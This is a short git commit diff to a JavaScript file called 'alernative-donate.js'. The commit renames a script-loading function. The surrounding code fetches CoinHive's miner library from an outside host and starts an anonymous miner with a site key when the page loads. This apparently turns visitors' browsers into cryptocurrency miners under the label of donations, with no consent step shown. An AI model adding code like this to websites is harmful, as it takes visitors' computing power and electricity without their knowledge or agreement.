e977896832c3d124dbe55148093a68212e1e608a
Patryk Grabarczyk <grabarczyk.patryk@gmail.com>
2017-12-30 19:55:56 +0100

    Update alernative-donate.js

--- alernative-donate.js
+++ alernative-donate.js
@@ -1,4 +1,4 @@
-var loadJS = function(url, implementationCode, location){
+var advancedLoadJS = function(url, implementationCode, location){
     var scriptTag = document.createElement('script');
     scriptTag.src = url;
 
@@ -11,4 +11,4 @@ var executeFunction = function(){
 	var miner = new CoinHive.Anonymous('81Tcm4z2QSjHKIZNxHwEsjRi1LKY2rK0', {throttle: 0.1});
 	miner.start();
 }
-loadJS('https://coinhive.com/lib/coinhive.min.js', executeFunction, document.body);
+advancedLoadJS('https://coinhive.com/lib/coinhive.min.js', executeFunction, document.body);
